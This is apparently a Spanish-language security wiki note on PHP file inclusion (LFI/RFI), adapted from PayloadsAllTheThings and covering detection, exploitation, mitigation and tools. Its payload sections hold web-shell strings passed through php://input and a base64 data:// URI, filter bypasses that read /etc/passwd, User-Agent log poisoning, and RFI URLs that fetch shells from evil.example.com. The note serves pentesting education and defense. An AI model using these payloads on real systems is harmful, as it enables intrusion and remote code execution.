---
tags:
  - seguridad-web
  - owasp
  - lfi
aliases:
  - LFI
  - RFI
  - Inclusión de archivos
  - File Inclusion
---

# Inclusión de archivos (LFI/RFI)

**La inclusión de archivos ocurre cuando una aplicación incluye un archivo a partir de entrada del usuario sin sanitizar.** Es habitual en PHP y puede derivar en ejecución de código, robo de datos y defacement.

> [!warning] Uso autorizado
> Técnicas para pruebas en sistemas propios o con autorización explícita. Ver [[📜 Fuentes y Licencias]].

## ¿Cómo funciona?
Funciones como `include`, `require` o `include_once` cargan y **ejecutan** un archivo cuya ruta depende de la entrada del usuario:

```php
<?php $file = $_GET['page']; include($file); ?>
```

- **LFI (Local File Inclusion):** se incluye un archivo del propio servidor (`/etc/passwd`, logs, código fuente). A diferencia del [[Path Traversal]] (que solo *lee*), aquí el contenido se *ejecuta*, abriendo la puerta a RCE.
- **RFI (Remote File Inclusion):** se incluye un archivo remoto controlado por el atacante. Requiere `allow_url_include = On`, desactivado por defecto desde PHP 5.

## Detección y pruebas
Identifica parámetros que apunten a archivos o plantillas (`page`, `file`, `lang`, `template`, `view`). Prueba incluir un archivo conocido y observa si su contenido aparece en la respuesta:

```
http://example.com/index.php?page=../../../etc/passwd
```

Para enumerar archivos interesantes según el SO, ver [[Path Traversal]].

## Explotación / payloads
**Wrappers de PHP** (lectura de fuente y RCE):

```
# Leer código fuente en Base64 (no se ejecuta el PHP)
php://filter/convert.base64-encode/resource=index.php

# Entrada directa para RCE (si allow_url_include=On)
php://input        # + cuerpo POST: <?php system($_GET['c']); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
expect://id
```

**Bypass de filtros LFI:**

```
# Null byte (PHP < 5.3.4)
../../../etc/passwd%00

# Doble codificación
%252e%252e%252fetc%252fpasswd

# UTF-8 overlong
%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd

# Secuencias mutiladas / truncamiento de ruta
....//....//etc/passwd
../../../etc/passwd/./././././.[...]
```

**Log poisoning** (LFI → RCE): inyectar PHP en una fuente que el servidor registre y luego incluir el log.

```
# 1) Inyectar payload en el User-Agent (queda en el access.log)
User-Agent: <?php system($_GET['c']); ?>
# 2) Incluir el log y ejecutar
http://example.com/index.php?page=/var/log/apache2/access.log&c=id
```

Otras fuentes envenenables: `/proc/self/environ`, logs de SSH/mail, sesiones PHP (`/var/lib/php/sessions/sess_<id>`).

**RFI:**

```
http://example.com/index.php?page=http://evil.example.com/shell.txt
# Si allow_url_include está Off, en Windows vía SMB:
http://example.com/index.php?page=\\10.0.0.1\share\shell.php
```

## Mitigación
- No construir rutas de inclusión a partir de entrada del usuario; usar una **lista de permitidos** (mapa fijo `id → archivo`).
- Desactivar `allow_url_include` y `allow_url_fopen` (RFI).
- Restringir con `open_basedir` y deshabilitar wrappers peligrosos.
- Normalizar y validar rutas; rechazar `../`, bytes nulos y secuencias codificadas. Ejecutar con privilegios mínimos.

## Herramientas
- **LFISuite**, **fimap**, **LFImap**, **Kadimus** — descubrimiento y explotación de LFI/RFI.
- **Panoptic** — recuperación de archivos de log y configuración por traversal.

---
🔗 Relacionado: [[Path Traversal]] · [[SSTI (Server-Side Template Injection)]] · [[Subida de archivos insegura]] · [[Laboratorio DVWA (CTF)]]
📚 Fuente: [PayloadsAllTheThings — File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion) (MIT, © Swissky)
